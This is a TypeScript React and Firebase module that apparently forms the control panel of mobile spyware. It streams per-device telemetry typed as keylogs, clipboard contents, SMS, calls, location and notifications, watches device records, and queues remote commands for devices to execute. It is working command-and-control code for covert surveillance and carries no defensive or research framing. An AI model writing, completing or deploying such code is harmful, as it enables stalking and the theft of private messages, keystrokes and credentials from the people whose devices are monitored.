import { useState, useEffect } from 'react'
import {
  collection, query, orderBy, limit, onSnapshot,
  addDoc, serverTimestamp, doc, onSnapshot as docSnapshot
} from 'firebase/firestore'
import { db } from '../firebase'

// ─── Types ────────────────────────────────────────────────────────────────────
export interface TelemetryEntry {
  id: string
  type: 'NOTIFICATION' | 'KEYLOG' | 'CLIPBOARD' | 'SMS' | 'CALL' | 'LOCATION'
  content: string
  app?: string
  timestamp: number   // epoch ms from Firestore
}

// ─── Telemetry Feed ───────────────────────────────────────────────────────────
export function useTelemetry(deviceId: string) {
  const [logs, setLogs] = useState<TelemetryEntry[]>([])
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    if (!deviceId) return
    setLogs([])
    setLoading(true)

    const q = query(
      collection(db, 'devices', deviceId, 'telemetry'),
      orderBy('timestamp', 'desc'),
      limit(100)
    )

    const unsub = onSnapshot(q, snap => {
      const entries: TelemetryEntry[] = snap.docs.map(d => ({
        id: d.id,
        type: d.data().type ?? 'NOTIFICATION',
        content: d.data().content ?? '',
        app: d.data().app,
        timestamp: d.data().timestamp?.toMillis?.() ?? Date.now(),
      }))
      setLogs(entries)
      setLoading(false)
    }, () => setLoading(false))

    return () => unsub()
  }, [deviceId])

  return { logs, loading }
}

// ─── Remote Commands ──────────────────────────────────────────────────────────
export async function sendCommand(deviceId: string, command: string) {
  await addDoc(collection(db, 'devices', deviceId, 'commands'), {
    command,
    status: 'pending',
    timestamp: serverTimestamp(),
  })
}

// ─── Device document watcher ─────────────────────────────────────────────────
export function useDeviceDoc(deviceId: string) {
  const [info, setInfo] = useState<Record<string, any> | null>(null)

  useEffect(() => {
    if (!deviceId) return
    const unsub = docSnapshot(doc(db, 'devices', deviceId), snap => {
      setInfo(snap.exists() ? snap.data() : null)
    })
    return () => unsub()
  }, [deviceId])

  return info
}
